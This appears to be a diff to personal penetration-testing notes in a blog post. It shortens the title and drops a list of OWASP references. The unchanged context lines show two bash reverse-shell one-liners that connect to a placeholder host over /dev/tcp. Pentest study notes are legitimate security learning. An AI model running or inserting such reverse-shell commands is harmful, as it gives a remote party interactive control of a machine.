@@ -1,5 +1,5 @@
 ---
-title: "Penetration Testing Tools and Methodology"
+title: "Penetration Testing"
 date: 2026-05-01T21:44:47+03:00
 draft: false
 description: "Personal notes on penetration testing tools, methodologies, and practical experience. Covers essential security assessment tools, their applications, and workflow insights."
@@ -210,8 +210,3 @@ bash -i >& /dev/tcp/<host>/<ip> 0>&1
 bash -c 'bash -i >& /dev/tcp/<host>/<ip> 0>&1'
 ```
 
-## References
-
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
